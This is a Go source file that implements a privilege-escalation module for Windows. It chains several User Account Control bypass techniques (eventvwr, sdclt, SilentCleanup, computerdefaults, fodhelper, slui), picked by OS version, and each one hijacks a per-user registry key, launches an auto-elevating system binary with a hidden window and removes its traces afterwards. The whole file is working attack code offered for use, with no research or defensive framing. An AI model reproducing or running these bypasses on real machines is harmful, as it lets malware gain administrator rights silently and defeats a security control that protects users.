package escalate

import (
	"bytes"
	"errors"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

// GetVer gets the major version of the current installed
// Windows
func getVer() (int, error) {
	cmd := exec.Command("cmd", "ver")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		return 0, err
	}
	osStr := strings.Replace(out.String(), "\n", "", -1)
	osStr = strings.Replace(osStr, "\r\n", "", -1)
	tmp1 := strings.Index(osStr, "[Version")
	tmp2 := strings.Index(osStr, "]")
	if tmp1 == -1 || tmp2 == -1 {
		return 0, errors.New("Version string has wrong format")
	}
	longVer := osStr[tmp1+9 : tmp2]
	majorVerStr := strings.SplitN(longVer, ".", 2)[0]
	majorVerInt, err := strconv.Atoi(majorVerStr)
	if err != nil {
		return 0, errors.New("Version could not be converted to int")
	}
	return majorVerInt, nil
}

// CheckElevate checks whether the current process has administrator
// privileges
func checkElevate() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

// Uacbypass bypasses User Account Control of Windows and escaletes
// privileges to root if User has root privileges
func escalate(path string) (err error) {
	log.Println("Path for bypass: (", path, ")")
	version, err := getVer()
	if err != nil {
		return
	}
	if version == 10 {
		if computerdefaults(path) == nil {
			log.Println("computerdefaults")
			return
		}
		if sdcltcontrol(path) == nil {
			log.Println("sdcltcontrol")
			return
		}
		if fodhelper(path) == nil {
			log.Println("fodhelper")
			return
		}
	}
	if version > 9 {
		if silentCleanUp(path) == nil {
			log.Println("silentCleanUp")
			return
		}
		if slui(path) == nil {
			log.Println("slui")
			return
		}
	}
	if version < 10 {
		if eventvwr(path) == nil {
			log.Println("eventvwr")
			return
		}
	}
	return errors.New("uac bypass failed")
}

//// TODO: cleanup Exploits

// eventvwr works on 7, 8, 8.1 fixed in win 10
func eventvwr(path string) (err error) {

	log.Println("eventvwr")
	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`,
		registry.SET_VALUE|registry.ALL_ACCESS)
	if err != nil {
		return
	}
	err = key.SetStringValue("", path)
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}

	time.Sleep(2 * time.Second)
	var cmd = exec.Command("eventvwr.exe")
	err = cmd.Run()
	if err != nil {
		return
	}
	time.Sleep(5 * time.Second)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile`)
	return
}

// sdcltcontrol works on Win 10
func sdcltcontrol(path string) error {

	log.Println("sdcltcontrol")
	var cmd *exec.Cmd

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`,
		registry.SET_VALUE)
	if err != nil {
		return err
	}

	if err := key.SetStringValue("", path); err != nil {
		return err
	}

	if err := key.Close(); err != nil {
		return err
	}

	time.Sleep(2 * time.Second)

	cmd = exec.Command("cmd", "/C", "start sdclt.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return err
	}
	time.Sleep(5 * time.Second)

	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`)
	if err != nil {
		return err
	}

	return nil
}

// silentCleanUp works on Win 8.1, 10(patched on some Versions) even on UAC_ALWAYSnotify
func silentCleanUp(path string) (err error) {

	log.Println("silentCleanUp")

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Environment`,
		registry.SET_VALUE)
	if err != nil {
		return
	}

	err = key.SetStringValue("windir", path)
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}
	time.Sleep(2 * time.Second)
	var cmd = exec.Command("cmd", "/C", "schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return
	}
	delkey, _ := registry.OpenKey(
		registry.CURRENT_USER, `Environment`,
		registry.SET_VALUE)
	delkey.DeleteValue("windir")
	delkey.Close()
	return
}

// computerdefaults works on Win 10 is more reliable than fodhelper
func computerdefaults(path string) (err error) {
	log.Println("computerdefaults")
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`, registry.QUERY_VALUE|registry.SET_VALUE)

	if err != nil {
		return
	}
	err = key.SetStringValue("", path)
	if err != nil {
		return
	}
	err = key.SetStringValue("DelegateExecute", "")
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}
	time.Sleep(2 * time.Second)

	var cmd = exec.Command("cmd", "/C", "start computerdefaults.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return
	}

	time.Sleep(5 * time.Second)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
	return
}

// fodhelper works on 10 but computerdefaults is more reliable
func fodhelper(path string) (err error) {
	log.Println("fodhelper")

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
		registry.SET_VALUE)
	if err != nil {
		return
	}
	err = key.SetStringValue("", path)
	if err != nil {
		return
	}
	err = key.SetStringValue("DelegeteExecute", "")
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}
	time.Sleep(2 * time.Second)

	var cmd = exec.Command("start fodhelper.exe")
	err = cmd.Run()
	if err != nil {
		return
	}
	time.Sleep(5 * time.Second)
	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`)
	if err != nil {
		return
	}
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
	return
}

// slui works on Win 8.1, 10
func slui(path string) (err error) {
	log.Println("slui")

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\exefile\shell\open\command`,
		registry.SET_VALUE|registry.ALL_ACCESS)

	if err != nil {
		return
	}
	err = key.SetStringValue("", path)
	if err != nil {
		return
	}
	err = key.SetStringValue("DelegateExecute", "")
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}

	time.Sleep(2 * time.Second)

	var cmd = exec.Command("slui.exe")
	err = cmd.Run()
	if err != nil {
		return
	}
	time.Sleep(5 * time.Second)

	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\exefile\`)
	return
}
